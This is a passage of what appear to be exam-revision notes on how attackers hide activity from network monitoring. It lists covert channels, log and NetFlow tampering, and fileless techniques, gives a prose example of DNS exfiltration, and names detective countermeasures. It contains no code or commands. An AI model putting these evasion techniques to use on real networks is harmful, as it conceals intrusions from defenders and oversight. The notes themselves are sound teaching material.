  4. Protocol abuse / covert channels: data hidden in DNS queries, ICMP echoes or HTTP headers evades ordinary monitoring.
  5. Log & flow manipulation: clearing device logs, disabling NetFlow, or flooding the SIEM with noise buries the real events.
  6. Fileless & in-memory techniques: no disk artifacts and legitimate admin tools (PowerShell, WMI) leave minimal traces.

Example. An attacker exfiltrates data through DNS TXT queries to a rogue authoritative server; the firewall sees only normal DNS — no file transfer is recorded.

Countermeasures: full-packet capture, NetFlow analysis, TLS inspection where lawful, DNS monitoring, NDR/IDS, strict egress filtering and correlated logging so hiding becomes detectable.

Exam tip (6 marks): Justify with at least four concrete hiding techniques and finishes with the detective controls that can still expose them.
